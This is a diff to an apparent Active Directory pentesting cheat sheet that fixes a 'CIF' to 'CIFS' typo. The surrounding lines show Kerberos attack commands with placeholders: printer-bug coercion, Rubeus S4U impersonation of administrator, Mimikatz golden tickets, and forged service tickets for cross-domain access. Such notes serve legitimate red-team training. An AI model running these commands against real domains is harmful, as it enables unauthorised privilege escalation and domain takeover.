@@ -261,8 +261,6 @@ spoolerscan.ps1
 ls \\<DC>\pipe\spoolss
 ```
 
-
-
 #### Attack
 ```
 .\MS-RPRN.exe \\<DC NAME> \\<TARGET SERVER WITH DELEGATION>
@@ -292,7 +290,7 @@ Get-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegat
 ```
 
 #### Rubeus request and inject TGT + TGS
-- Possbible services: CIF for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM and LDAP for dcsync
+- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
 ```
 .\Rubeus.exe s4u /user:<USERNAME> /rc4:<NTLM HASH> /impersonateuser:administrator /domain:<DOMAIN> /msdsspn:CIFS/<SERVER FQDN> /altservice:<SECOND SERVICE> /<SERVER FQDN> /ptt
 ```
@@ -439,13 +437,13 @@ Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<FQDN CH
 ```
 
 #### Create a TGS using Rubeus and inject current Powershell session
-- Possbible services: CIF for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM and LDAP for dcsync
+- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
 ```
 .\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:<SERVICE>/<FQDN PARENT DC> /dc:<FQDN PARENT DC> /ptt
 ```
 
 #### Create a TGS for a service (kekeo_old and new)
-- Possbible services: CIF for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM and LDAP for dcsync
+- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
 ```
 ./asktgs.exe <KIRBI FILE> <SERVICE>/<FQDN PARENT DC>
 tgs::ask /tgt:<KIRBI FILE> /service:<SERVICE>/<FQDN PARENT DC>
@@ -519,13 +517,13 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN>
 ```
 
 #### Create and inject TGS
-- Possbible services: CIF for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM and LDAP for dcsync
+- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
 ```
 .\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:CIFS/<TARGET SERVER> /dc:<TARGET FOREST DC> /ptt
 ```
 
 #### Create a TGS for a service (kekeo_old)
-- Possbible services: CIF for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM and LDAP for dcsync
+- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
 ```
 ./asktgs.exe <KIRBI FILE> CIFS/<TARGET SERVER>
 ```
